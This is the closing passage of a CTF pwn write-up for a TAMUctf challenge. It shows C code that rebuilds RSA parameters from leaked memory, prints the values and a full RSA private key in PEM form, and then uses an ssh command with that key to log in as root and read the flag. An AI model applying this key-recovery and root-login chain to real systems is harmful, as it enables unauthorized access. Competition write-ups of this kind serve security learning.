+</span></span><span style=display:flex><span><span style=color:#bb9af7>struct</span> bignum_st {
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>uint64_t</span> <span style=color:#9ece6a;font-weight:700>*</span>d; <span style=color:#414868;font-style:italic>/* Pointer to an array of &#39;BN_BITS2&#39; bit chunks. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> top;     <span style=color:#414868;font-style:italic>/* Index of last used d +1. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>/* The next are internal book keeping for bn_expand. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> dmax; <span style=color:#414868;font-style:italic>/* Size of the d array. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> neg;  <span style=color:#414868;font-style:italic>/* one if the number is negative */</span>
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> flags;
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>typedef</span> <span style=color:#bb9af7>struct</span> bignum_st BIGNUM;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#41a6b5>void</span> <span style=color:#7aa2f7>bn2bin</span>(<span style=color:#bb9af7>const</span> <span style=color:#41a6b5>uint64_t</span> <span style=color:#9ece6a;font-weight:700>*</span>a, <span style=color:#41a6b5>int</span> n, <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>to) {
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>uint64_t</span> l;
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>int</span> i <span style=color:#9ece6a;font-weight:700>=</span> (n <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>7</span>) <span style=color:#9ece6a;font-weight:700>/</span> <span style=color:#e0af68>8</span>;
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>while</span> (i<span style=color:#9ece6a;font-weight:700>--</span>) {
+</span></span><span style=display:flex><span>    l <span style=color:#9ece6a;font-weight:700>=</span> a[i <span style=color:#9ece6a;font-weight:700>/</span> <span style=color:#e0af68>8</span>];
+</span></span><span style=display:flex><span>    <span style=color:#9ece6a;font-weight:700>*</span>(to<span style=color:#9ece6a;font-weight:700>++</span>) <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>char</span>)(l <span style=color:#9ece6a;font-weight:700>&gt;&gt;</span> (<span style=color:#e0af68>8</span> <span style=color:#9ece6a;font-weight:700>*</span> (i <span style=color:#9ece6a;font-weight:700>%</span> <span style=color:#e0af68>8</span>))) <span style=color:#9ece6a;font-weight:700>&amp;</span> <span style=color:#e0af68>0xff</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#41a6b5>void</span> <span style=color:#7aa2f7>hexdump</span>(<span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>buf, <span style=color:#41a6b5>int</span> n) {
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>for</span> (<span style=color:#41a6b5>int</span> i <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>; i <span style=color:#9ece6a;font-weight:700>&lt;</span> n; <span style=color:#9ece6a;font-weight:700>++</span>i)
+</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>printf</span>(<span style=color:#9ece6a>&#34;%02x&#34;</span>, buf[i]);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>putchar</span>(<span style=color:#e0af68>10</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>main</span>() {
+</span></span><span style=display:flex><span>  BIGNUM <span style=color:#9ece6a;font-weight:700>*</span>n_bn <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>BN_new</span>();
+</span></span><span style=display:flex><span>  n_bn<span style=color:#9ece6a;font-weight:700>-&gt;</span>d <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#41a6b5>uint64_t</span> <span style=color:#9ece6a;font-weight:700>*</span>)n;
+</span></span><span style=display:flex><span>  n_bn<span style=color:#9ece6a;font-weight:700>-&gt;</span>top <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>32</span>;
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>nbuf <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>BN_bn2hex</span>(n_bn);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>printf</span>(<span style=color:#9ece6a>&#34;n = 0x%s</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>, nbuf);
+</span></span><span style=display:flex><span>  BIGNUM <span style=color:#9ece6a;font-weight:700>*</span>d_bn <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>BN_new</span>();
+</span></span><span style=display:flex><span>  d_bn<span style=color:#9ece6a;font-weight:700>-&gt;</span>d <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#41a6b5>uint64_t</span> <span style=color:#9ece6a;font-weight:700>*</span>)d;
+</span></span><span style=display:flex><span>  d_bn<span style=color:#9ece6a;font-weight:700>-&gt;</span>top <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>32</span>;
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>dbuf <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>BN_bn2hex</span>(d_bn);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>printf</span>(<span style=color:#9ece6a>&#34;d = 0x%s</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>, dbuf);
+</span></span><span style=display:flex><span>  BIGNUM <span style=color:#9ece6a;font-weight:700>*</span>p_bn <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>BN_new</span>();
+</span></span><span style=display:flex><span>  p_bn<span style=color:#9ece6a;font-weight:700>-&gt;</span>d <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#41a6b5>uint64_t</span> <span style=color:#9ece6a;font-weight:700>*</span>)p;
+</span></span><span style=display:flex><span>  p_bn<span style=color:#9ece6a;font-weight:700>-&gt;</span>top <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>16</span>;
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>pbuf <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>BN_bn2hex</span>(p_bn);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>printf</span>(<span style=color:#9ece6a>&#34;p = 0x%s</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>, pbuf);
+</span></span><span style=display:flex><span>  BIGNUM <span style=color:#9ece6a;font-weight:700>*</span>q_bn <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>BN_new</span>();
+</span></span><span style=display:flex><span>  q_bn<span style=color:#9ece6a;font-weight:700>-&gt;</span>d <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#41a6b5>uint64_t</span> <span style=color:#9ece6a;font-weight:700>*</span>)q;
+</span></span><span style=display:flex><span>  q_bn<span style=color:#9ece6a;font-weight:700>-&gt;</span>top <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>16</span>;
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>qbuf <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>BN_bn2hex</span>(q_bn);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>printf</span>(<span style=color:#9ece6a>&#34;q = 0x%s</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>, qbuf);
+</span></span><span style=display:flex><span>  BIGNUM <span style=color:#9ece6a;font-weight:700>*</span>c_bn <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>BN_new</span>();
+</span></span><span style=display:flex><span>  c_bn<span style=color:#9ece6a;font-weight:700>-&gt;</span>d <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#41a6b5>uint64_t</span> <span style=color:#9ece6a;font-weight:700>*</span>)c;
+</span></span><span style=display:flex><span>  c_bn<span style=color:#9ece6a;font-weight:700>-&gt;</span>top <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>16</span>;
+</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>cbuf <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>BN_bn2hex</span>(c_bn);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>printf</span>(<span style=color:#9ece6a>&#34;c = 0x%s</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>, cbuf);
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> <span style=color:#e0af68>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>and this output into hex digits of the RSA parameter</p><pre><code>n = 0xCF8D989FB4538DDF2C4A893260202A0E8886B2ADC9464D2196E2994306470BD847D87D7417348BFBDBEA7641A56477D6F642557E840D79E29FDC06AD71832D2C34541DFE55DBEC9067C7ABB749751BAA302642C692DAE903E8220C857C2E0DD4EAF05781EF72A1FC738AF70ADCB9CDA56F29A98D570A704A865D485DAC68E895B8AAFB929EBF74E72B7B9EF5F0463E968DACE20C6E37C2F9258661498CDE4070D71FED2D250CC0D1288EC4D8C8148C4ED4F4429BBDDFF9F73CD02A8B3834D842A1CC75C88187A570307616DD9B41411D5D5AA6CBAD40E531EB3C099AB487F180F07DAD19CBB79002F6C1D7A24D7912D5B16734EA8F415C7A13D77098C6E70153
+d = 0x5DE8EE76CC6BC5D485C0CFE4F83375740FF80A5EB1A45A7FE93A6C28346DEF011438F34294C154D9477F05B4DC35E23764434D55AA4042B6F4A7E46993E3CB8BA5BDADB88776B3C9FEFB0C4A293590A7E79358416AEF1BE185A5EA4E778A8AFD9CB3D4945918600CCEE6C0B2AC7E717AFA1A3ABA55F8C628223590E9B979DA4A1B889968692568CAF883E0C6E51E2D5F76B839D8CE910DB5C794C5FE25C5FA23FD397D3F26824BEBA42A82066CFF7B653B593593706EDA4A30016DA97F319FB9401FFBFC989981D564104B587101B58C17D29354EDF69D32CD09D2125BBED0017001DF21DC30FA5292C7522A35634FB75A4A3DAA3686B40FC970494FE69C1C29
+p = 0xEE29A73BDC029A08149453C0841E16E5430E8A61DEE31B07E732FCBCAB80CBD2A2BA43BE016DBD42AF8E2F25F2138A321C30447B4C53B8276A8BDA7DECB9BF28484279FA9DDA444C2CE91D3D6AD7D8CA406BD8BD8DE1FB88A0CAB1F8C45923F6CD30528134778F65F1BE8B3BCD095F0EED43050B8E04E4883BE14A864041825D
+q = 0xDF190EEB59B301492E1A2874130FCBECC18F881921561F0C1B80D9A6CECD78D062E1F9C94E6979CC187B5F7B931F979D99A80A001A816A8AF817987C2C127FC0AD992D53EE8DDF8A442A09032A64A32084F2C891984853B0C8488CAE9660FF97B9F7479F641753B6316E7AE07E179DEDC0ECB819543A5054D60922A0489BB76F
+c = 0x0AB32488ACAC9A92F34BAEBAFFB37FD3A47A451BC90EA084F3E0BA1066C3F45F34A9088ADF0137E7FE18056A07A53F5FAB6FEBE1BF762849CA4CC726153F55037069525CCCAD597F33749E6EADC4CC6341987261D284B062DBAAE4CD9B6F08CEE988B1463DBA43E3405731B6A0CDFD88E46D6E5C4C445E90EB93E80EC4D7142F
+</code></pre><p>Reconstruct this to PEM format, and we finally can use it as a private key to log in with ssh.</p><pre><code>-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAz42Yn7RTjd8sSokyYCAqDoiGsq3JRk0hluKZQwZHC9hH2H10
+FzSL+9vqdkGlZHfW9kJVfoQNeeKf3AatcYMtLDRUHf5V2+yQZ8ert0l1G6owJkLG
+ktrpA+giDIV8Lg3U6vBXge9yofxzivcK3LnNpW8pqY1XCnBKhl1IXaxo6JW4qvuS
+nr905yt7nvXwRj6WjaziDG43wvklhmFJjN5AcNcf7S0lDMDRKI7E2MgUjE7U9EKb
+vd/59zzQKos4NNhCocx1yIGHpXAwdhbdm0FBHV1apsutQOUx6zwJmrSH8YDwfa0Z
+y7eQAvbB16JNeRLVsWc06o9BXHoT13CYxucBUwIDAQABAoIBAF3o7nbMa8XUhcDP
+5PgzdXQP+ApesaRaf+k6bCg0be8BFDjzQpTBVNlHfwW03DXiN2RDTVWqQEK29Kfk
+aZPjy4ulva24h3azyf77DEopNZCn55NYQWrvG+GFpepOd4qK/Zyz1JRZGGAMzubA
+sqx+cXr6Gjq6VfjGKCI1kOm5edpKG4iZaGklaMr4g+DG5R4tX3a4OdjOkQ21x5TF
+/iXF+iP9OX0/JoJL66QqggZs/3tlO1k1k3Bu2kowAW2pfzGfuUAf+/yYmYHVZBBL
+WHEBtYwX0pNU7fadMs0J0hJbvtABcAHfIdww+lKSx1IqNWNPt1pKPao2hrQPyXBJ
+T+acHCkCgYEA7imnO9wCmggUlFPAhB4W5UMOimHe4xsH5zL8vKuAy9KiukO+AW29
+Qq+OLyXyE4oyHDBEe0xTuCdqi9p97Lm/KEhCefqd2kRMLOkdPWrX2MpAa9i9jeH7
+iKDKsfjEWSP2zTBSgTR3j2Xxvos7zQlfDu1DBQuOBOSIO+FKhkBBgl0CgYEA3xkO
+61mzAUkuGih0Ew/L7MGPiBkhVh8MG4DZps7NeNBi4fnJTml5zBh7X3uTH5edmagK
+ABqBaor4F5h8LBJ/wK2ZLVPujd+KRCoJAypkoyCE8siRmEhTsMhIjK6WYP+XufdH
+n2QXU7Yxbnrgfhed7cDsuBlUOlBU1gkioEibt28CgYEAyIdf3QHhWupE0aM3LMbd
+BkqQ2qmPbu9alyuSLBXHi1aeV3EkcbWBrr18XWx4yEUK7jsh3iMlNqBRkNH2RzUa
+pAM7ndMLyDTLYuEhEo58kXeyCFxlNiq5jI++O123jUq/yoLOZSXVKXNvub0oK/qh
+BEN3s67H9IyrvKd0BVfjEK0CgYEAmfoBgg32rfyEBSnGcyGD7XPqTFSL3ZSwFotn
+rOkuhyPMG4r6lVPW7DY5cD0p3bQW4eZIgKnKiG5BrIdhrElYQvONtOsoymJuW31n
+mve3XZ8kIyyq0B+bI3gYGoCk6W1+mqtAk5HRR8WHeGj2aBCEv4NX3fgdWeH3q4HC
+lD2Iu6ECgYAKsySIrKyakvNLrrr/s3/TpHpFG8kOoITz4LoQZsP0XzSpCIrfATfn
+/hgFagelP1+rb+vhv3YoScpMxyYVP1UDcGlSXMytWX8zdJ5urcTMY0GYcmHShLBi
+26rkzZtvCM7piLFGPbpD40BXMbagzf2I5G1uXExEXpDrk+gOxNcULw==
+-----END RSA PRIVATE KEY-----
+</code></pre><h3 id=fourth-stage---end-game>Fourth Stage - End Game</h3><p>As you already know, tamuctf has really strict internet. We can&rsquo;t directly access port 22, but we can do ssh from inside the box. So, the path is clear, upload the private key and execute ssh with the uploaded private key.</p><pre tabindex=0><code>$ ssh -o StrictHostKeyChecking=no -i priv root@localhost
+# cat f*
+gigem{wh0_541d_py7h0n_c4n7_b3_b1n4ry}
+</code></pre><div><div>Tags:</div><ul><li><a href=/tags/ctf-writeup/>Ctf-Writeup</a></li><li><a href=/tags/pwn/>Pwn</a></li></ul></div></article></main><footer><p>&copy; 2025 circleous. Licensed under <a href=https://creativecommons.org/publicdomain/zero/1.0/ target=_blank>CC0</a>.</p></footer></body></html>
